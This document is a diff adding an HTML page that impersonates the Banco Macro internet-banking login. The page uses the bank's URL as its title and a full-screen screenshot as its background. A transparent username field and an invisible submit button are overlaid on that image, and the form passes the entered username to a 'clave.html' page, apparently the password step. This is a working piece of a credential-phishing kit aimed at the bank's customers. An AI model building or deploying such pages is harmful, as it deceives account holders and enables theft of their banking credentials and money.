@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>https://www.macro.com.ar/bancainternet/</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: url('fondo_usuario.jpg') no-repeat top left;
+            background-size: 100% 100%;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+        form {
+            position: absolute;
+            top: 39%;
+            right: 4%;
+            width: 280px;
+        }
+        .campo-transparente {
+            width: 100%;
+            height: 55px;
+            border: none;
+            background: transparent;
+            color: #000;
+            font-size: 16px;
+            padding: 0 10px;
+            outline: none;
+            cursor: text;
+        }
+        .boton-invisible {
+            position: absolute;
+            top: 64px;
+            left: 0;
+            width: 100%;
+            height: 40px;
+            border: none;
+            background: transparent;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <form action="clave.html" method="get">
+        <input type="text" name="usuario" class="campo-transparente" required>
+        <button type="submit" class="boton-invisible"></button>
+    </form>
+</body>
+</html>
